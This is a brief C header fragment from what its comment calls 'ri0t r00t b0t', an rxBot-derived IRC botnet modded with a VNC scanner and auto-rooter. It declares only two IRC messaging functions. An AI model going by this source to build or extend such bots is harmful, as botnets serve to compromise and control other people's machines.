/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


void irc_sendv(SOCKET sock, char *msg, ...);
void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice, BOOL delay=FALSE);
